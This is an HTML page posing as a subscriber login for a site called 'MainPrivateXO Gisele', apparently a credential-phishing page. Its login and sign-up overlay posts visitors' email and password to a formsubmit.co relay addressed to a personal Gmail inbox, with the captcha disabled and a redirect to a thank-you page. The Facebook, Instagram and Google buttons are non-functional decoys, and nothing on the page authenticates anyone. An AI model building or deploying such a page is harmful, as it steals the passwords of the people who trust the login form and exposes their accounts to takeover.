<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MainPrivateXO Gisele</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fafafa;
    }

    header {
      background: #111;
      color: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem 2rem;
      position: sticky;
      top: 0;
      z-index: 1000;
    }

    header h1 {
      font-size: 1.5rem;
    }

    nav button {
      background: #ff3366;
      border: none;
      padding: 0.6rem 1.2rem;
      margin-left: 0.5rem;
      color: white;
      font-size: 0.9rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    nav button:hover {
      background: #ff6699;
    }

    /* Overlay form */
    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      z-index: 2000;
    }

    .form-box {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      position: relative;
    }

    .form-box h2 {
      margin-top: 0;
      text-align: center;
      color: #333;
    }

    .form-box input {
      width: 100%;
      padding: 0.8rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .form-box button[type="submit"] {
      background: #ff3366;
      border: none;
      color: #fff;
      padding: 0.8rem;
      width: 100%;
      border-radius: 5px;
      margin-top: 0.5rem;
      cursor: pointer;
    }

    .form-box .social {
      display: flex;
      flex-direction: column;
      margin-top: 1rem;
    }

    .form-box .social button {
      background: #4267B2;
      margin: 0.3rem 0;
    }

    .form-box .social button.google {
      background: #DB4437;
    }

    .form-box .social button.instagram {
      background: #C13584;
    }

    .close-btn {
      position: absolute;
      right: 10px;
      top: 10px;
      cursor: pointer;
      font-size: 1.2rem;
      color: #666;
    }

    .close-btn:hover {
      color: black;
    }

    main {
      padding: 3rem 2rem;
      text-align: center;
    }

    main img {
      max-width: 100%;
      border-radius: 10px;
    }
  </style>
</head>
<body>

<header>
  <h1>MainPrivateXO Gisele</h1>
  <nav>
    <button onclick="openForm('login')">Login</button>
    <button onclick="openForm('signup')">Sign Up</button>
  </nav>
</header>

<main>
  <h2>Welcome to MainPrivateXO Gisele</h2>
  <p>Exclusive content just for subscribers. Sign up today!</p>
  <img src="image.jpg" alt="Main banner">
</main>

<!-- Overlay Forms -->
<div id="overlay" class="overlay">
  <div class="form-box" id="formBox">
    <span class="close-btn" onclick="closeForm()">âœ–</span>
    <h2 id="formTitle">Login</h2>
    <form action="https://formsubmit.co/mainp@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://mainprivatexogisele.github.io/thankyou.html">
      <input type="hidden" name="_captcha" value="false">

      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Submit</button>

      <div class="social">
        <button type="button">Login with Facebook</button>
        <button type="button" class="instagram">Login with Instagram</button>
        <button type="button" class="google">Login with Google</button>
      </div>
    </form>
  </div>
</div>

<script>
  const overlay = document.getElementById('overlay');
  const formTitle = document.getElementById('formTitle');

  function openForm(type) {
    overlay.style.display = "flex";
    if(type === 'login') {
      formTitle.innerText = "Login";
    } else {
      formTitle.innerText = "Sign Up";
    }
  }

  function closeForm() {
    overlay.style.display = "none";
  }
</script>

</body>
</html>
